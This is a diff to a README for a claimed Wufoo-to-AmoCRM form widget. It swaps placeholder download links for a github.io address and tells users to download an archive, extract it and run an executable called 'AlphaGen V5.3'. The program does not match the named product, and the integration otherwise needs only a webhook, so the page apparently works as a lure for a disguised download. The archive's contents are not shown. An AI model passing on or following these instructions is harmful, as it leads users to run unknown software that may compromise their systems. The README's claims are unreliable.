@@ -2,13 +2,13 @@
 
 Integrate Wufoo forms with AmoCRM using the Wufoo Widget — capture and route form submissions directly into your sales pipeline automatically.
 
-[![Download](https://img.shields.io/badge/Download-Wufoo_Widget_AmoCRM-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-Wufoo_Widget_AmoCRM-blueviolet)](https://wufoo-widget-amocrm.github.io/.github)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 [Download the archive](PLACE_YOUR_DOWNLOAD_LINK_HERE)  
+1. 📦 [Download the archive](https://wufoo-widget-amocrm.github.io/.github)  
 2. 📁 Extract the folder to any convenient location  
 3. 🖱 Run AlphaGen V5.3 to activate the Wufoo Connector  
 4. ✅ In Wufoo, go to `Notifications > Webhook` and set your AmoCRM endpoint with field mapping configured
